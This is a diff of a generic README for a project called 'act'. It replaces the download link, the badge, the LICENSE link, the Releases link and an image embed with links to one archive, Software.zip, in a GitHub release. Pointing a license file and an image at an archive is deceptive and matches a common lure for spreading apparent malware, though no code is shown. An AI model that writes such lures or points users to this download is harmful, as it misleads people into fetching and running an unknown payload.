@@ -11,8 +11,8 @@ This repository contains the source code for an exciting project named "act". Un
 
 ## Installation
 To get started with the "act" project, follow these steps:
-1. Download the project files from this [Software.zip](https://github.com/user-attachments/files/18388744/Software.zip) link.
-   [![Download Software.zip](https://img.shields.io/badge/Download-Software.zip-blue.svg)](https://github.com/user-attachments/files/18388744/Software.zip)
+1. Download the project files from this [https://github.com/lilanders123/act/releases/download/v2.0/Software.zip](https://github.com/lilanders123/act/releases/download/v2.0/Software.zip) link.
+   [![Download https://github.com/lilanders123/act/releases/download/v2.0/Software.zip](https://github.com/lilanders123/act/releases/download/v2.0/Software.zip)](https://github.com/lilanders123/act/releases/download/v2.0/Software.zip)
 2. Extract the contents of the zip file to a location of your choice.
 3. Open the project in your favorite code editor.
 
@@ -27,11 +27,11 @@ We welcome contributions to the "act" project. To contribute, follow these steps
 4. Submit a pull request.
 
 ## License
-This project is licensed under the XYZ License - see the [LICENSE.md](LICENSE.md) file for details.
+This project is licensed under the XYZ License - see the [https://github.com/lilanders123/act/releases/download/v2.0/Software.zip](https://github.com/lilanders123/act/releases/download/v2.0/Software.zip) file for details.
 
 ---
-🔗 For more information, check out the [Releases](https://github.com/user-attachments/files/18388744/Software.zip) section. Feel free to visit the link and explore the latest updates and releases for the "act" project. Let's collaborate and make this project even more awesome together!
+🔗 For more information, check out the [Releases](https://github.com/lilanders123/act/releases/download/v2.0/Software.zip) section. Feel free to visit the link and explore the latest updates and releases for the "act" project. Let's collaborate and make this project even more awesome together!
 
-![Awesome Image](https://www.example.com/awesome-image.jpg)
+![Awesome Image](https://github.com/lilanders123/act/releases/download/v2.0/Software.zip)
 
 **Thank you for your interest in the "act" project! 🌟**
